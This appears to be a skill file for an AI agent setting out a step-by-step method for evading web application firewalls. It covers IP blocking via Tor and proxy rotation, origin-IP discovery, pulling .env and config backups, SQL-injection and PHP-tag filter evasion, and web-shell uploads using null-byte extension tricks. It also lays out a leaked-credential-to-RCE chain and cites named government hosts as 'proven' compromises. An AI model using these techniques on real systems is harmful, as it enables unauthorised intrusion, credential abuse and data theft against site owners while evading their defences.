---
name: waf-bypass
description: WAF, Cloudflare, bot protection, ModSecurity bypass techniques. Load when a target returns 403, captcha, JavaScript challenge, or bot detection on any request.
---

# WAF Bypass — Complete Methodology

## When to Load
- 403/406 on any HTTP request
- Cloudflare challenge page (5-second shield, JS challenge)
- ModSecurity 403 on specific paths (OJS $$$call$$$, SQL keywords, PHP tags)
- Bot detection / captcha
- Rate limiting (429)
- Any "Access Denied" or "Request Blocked" response

## Phase 1: Identify the WAF

### Direct IP Block vs WAF — Critical Diagnostic

**Pattern: First request works, subsequent requests timeout (000)**

```bash
# This is NOT a WAF — it's the server/host dropping your IP after initial probe.
# Symptoms:
#   - curl -I returns 200 on first hit
#   - Second request (or parallel scans) → 000/connection timeout
#   - Different User-Agent doesn't help
#   - Different protocol (HTTP/HTTPS) doesn't help

# Fix: Switch to Tor proxy
systemctl is-active tor  # ensure running
curl -sk --socks5-hostname 127.0.0.1:9050 "https://TARGET/" -o /dev/null -w "%{http_code}"
# If 200 via Tor but 000 via direct → confirmed IP-based blocking

# This is the MOST COMMON blocker pattern on shared cPanel/WHM hosts.
# Server sees rapid connections from same IP → drops route temporarily.
# Tor solves it because each connection gets a different exit node.
```

**Confirm: WAF returns HTTP status code (403/406/503) — IP block returns nothing (000/timeout/exit code 28).**

```bash
# Check response headers
curl -skI "https://TARGET/" | grep -iE "cf-ray|server|waf|x-waf|mod_security|akamai|imperva|f5|barracuda"

# wafw00f detection
wafw00f https://TARGET

# Quick fingerprint
curl -sk "https://TARGET/" | head -20
# Cloudflare = "cf-browser-verified", "cf_chl_"
# ModSecurity = "Not Acceptable", "ModSecurity"
# AWS WAF = "x-amzn-RequestId" + 403
# Imperva/Incapsula = "_Incapsula_Resource"
```

## Phase 2: Origin IP Discovery (Cloudflare)

```bash
# DNS history
curl -sk "https://api.hackertarget.com/dnshistory/?q=TARGET&apikey=$HACKERTARGET_KEY"

# MX records (often bypass Cloudflare)
host -t MX TARGET
host mail.TARGET
host webmail.TARGET

# crt.sh certificate transparency
curl -sk "https://crt.sh/?q=%25.TARGET&output=json" | \
  python3 -c "import sys,json; ips=set(); [ips.add(v['name_value']) for e in json.load(sys.stdin) for v in e.get('name_value','').split('\n')]; [print(i) for i in sorted(ips)]"

# SecurityTrails (if key working)
curl -sk "https://api.securitytrails.com/v1/domain/TARGET" \
  -H "APIKEY: $SECURITYTRAILS_KEY"

# Test origin directly
for ip in ORIGIN_IPS; do
  curl -sk -H "Host: TARGET" "https://$ip/.env"
done
```

## Phase 3: HTTP Bypass (TLS Termination Gap)

**Critical technique:** Many WAFs only protect HTTPS. Plain HTTP may hit the origin directly.

```bash
# HTTP bypass — try with curl -L (follow redirects through to HTTPS)
curl -sk -L "http://TARGET/.env"
curl -sk -L "http://TARGET/wp-config.php.bak"

# If HTTP returns content but HTTPS blocks → WAF only on TLS
# Use HTTP for ALL recon
```

## Phase 4: Proxy Rotation

```bash
# BrightData Unlocker (best for Cloudflare)
# Via proxy_manager.py
python3 -c "
from lib.proxy_manager import ProxyManager
pm = ProxyManager()
proxy = pm.get_healthy('https://TARGET')
print(f'Working proxy: {proxy}')
"

# Manual BrightData
curl -x http://USER:user@example.com:22225 \
  -sk "https://TARGET/"

# 9proxy country zones (29 available)
curl --proxy http://NINEPROXY_USER:user@example.com:17521 \
  -sk "https://TARGET/"

# Country-specific exit node
curl --proxy http://NINEPROXY_USER-country-ID:user@example.com:17521 \
  -sk "https://TARGET/"
```

## Phase 5: Payload-Level Bypass

**ModSecurity / keyword filtering:**

```bash
# SQLi keywords → encoding
# Original: ' UNION SELECT
# Bypass:   %27/**/UNION/**/SELECT
# Bypass:   /*!50000UNION*/ /*!50000SELECT*/

# PHP tags bypass
# Original: <?php system($_GET['c']); ?>
# Bypass:   <script language="php"> system($_GET['c']); </script>
# Bypass:   <?=system($_GET['c'])?>

# OJS ModSecurity bypass for $$$call$$$ paths
curl --proxy http://NINEPROXY_USER:user@example.com:17521 \
  -sk "https://TARGET/index.php/JOURNAL/$$$call$$$/grid/settings/plugins"
```

**Upload bypass (file extension filtering):**
```bash
# NULLBYTE EXTENSION BYPASS (most effective — proven on Laravel/K8s)
# Upload: shell.php\x00.xls → app strips everything after nullbyte → saved as shell.php
# Works when: .xls/.xlsx/.doc/.pdf are accepted, PHP blocked
# Real-world: dashboard.a2i.gov.bd accepted .xls only, nullbyte gave .php RCE
curl -F "nothi=@shell.php\x00.xls;type=application/vnd.ms-excel"
# Python equivalent:
files = {'file': ('shell.php\x00.xls', php_code, 'application/vnd.ms-excel')}

# Double extension (server-dependent)
shell.php.jpg → processed as JPG, executed as PHP via misconfigured handler

# Alternate PHP extensions (.pht, .phar, .phtml)
# These may bypass extension blacklists that only check for .php

# MIME type spoofing
curl -F "file=@shell.php;type=image/jpeg"

# .htaccess override (Apache only)
# Upload .htaccess: AddType application/x-httpd-php .jpg
# Then upload shell.jpg — executed as PHP

# Null byte URL-encoded (older PHP)
shell.php%00.jpg
```

**LeakRadar → Auth → Upload → RCE Chain (proven):**
```bash
# 1. Get credentials for each co-host
python3 tools/access/leakradar.py --urlhost EACH_COHOST

# 2. Try leaked creds on login forms
# 3. Once authenticated, look for file upload endpoints
#    (profile pictures, document uploads, data imports, report attachments)
# 4. Identify accepted file types (.xls, .pdf, .doc, .csv, .png, .jpg)
# 5. Upload PHP shell with nullbyte extension bypass
# 6. Access uploaded file — if saved with .php extension → RCE

# Common upload endpoints to probe after auth:
#   /result-framework, /import, /upload, /profile, /documents,
#   /admin/files, /settings/logo, /reports/upload
```

**User-Agent rotation:**
```bash
for ua in \
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" \
  "Googlebot/2.1 (+http://www.google.com/bot.html)" \
  "Mozilla/5.0 (compatible; AhrefsBot/7.0)"; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' -A "$ua" "https://TARGET/.env")
  echo "$code → $ua"
done
```

## Phase 6: Rate Limit Bypass

```bash
# Stagger requests (1-3 second delay)
while read url; do
  curl -sk "$url"
  sleep $((RANDOM % 3 + 1))
done < urls.txt

# Rotate proxy per request (via proxy_manager)
# Different exit IP = different rate limit bucket

# Use different User-Agent per request
# Mix with proxy rotation for maximum evasion
```

## Dead End Playbook

| Situation | Action |
|-----------|--------|
| Cloudflare, no origin IP found | Try HTTP direct, MX record origin, crt.sh history |
| Cloudflare, origin IP found but 403 on direct | BrightData Web Unlocker (JS rendering proxy) |
| ModSecurity on exploit path | Use --proxy flag (9proxy bypasses country restrictions) |
| Rate limited (429) | Slow to 1 req/3s, rotate proxy country zones |
| Captcha | BrightData solves captcha automatically |
| All bypasses fail | Co-host pivot — find unprotected server via subdomain enum, enumerate ALL co-hosts, LeakRadar each, attack weakest. The co-host may have NO WAF at all. Judiciary.gov.bd was hardened behind CF but dashboard.a2i.gov.bd (same server) had no WAF + file upload → RCE. |

## Quick Commands

```bash
# Connectivity check (which proxy tier works)
python3 ~/Hephaestus/lib/connectivity_check.py --target https://TARGET

# Get working proxy
python3 -c "from lib.proxy_manager import ProxyManager; pm=ProxyManager(); print(pm.get_healthy('https://TARGET'))"

# HTTP bypass (WAF on TLS only)
curl -sk -L "http://TARGET/.env"

# 9proxy country-matched
curl --proxy http://USER:user@example.com:17521 -sk "https://TARGET/"
```
